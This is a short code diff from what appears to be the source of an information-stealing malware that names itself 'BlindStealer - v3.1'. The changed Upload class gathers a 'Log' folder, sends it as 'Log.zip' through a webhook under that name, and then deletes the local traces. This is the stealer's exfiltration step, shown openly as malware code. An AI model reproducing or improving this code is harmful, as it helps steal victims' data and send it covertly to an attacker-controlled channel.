@@ -31,7 +31,6 @@ class Upload:
         self.write_files()
         self.send()
         self.clean()
-        self.webhook.send()
     
     def write_files(self):
         os.makedirs("Log", exist_ok=True)
@@ -67,6 +66,8 @@ class Upload:
                 color=0x24262A,
             ),
             file=File("Log.zip"),
+                username="BlindStealer - v3.1",
+                avatar_url="https://i.imgur.com/LNVOaxg.png",
         ) 
     def clean(self):
         shutil.rmtree("Log")
@@ -487,5 +488,3 @@ class Types:
 
         def __repr__(self):
             return self.__str__()
-            
-            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
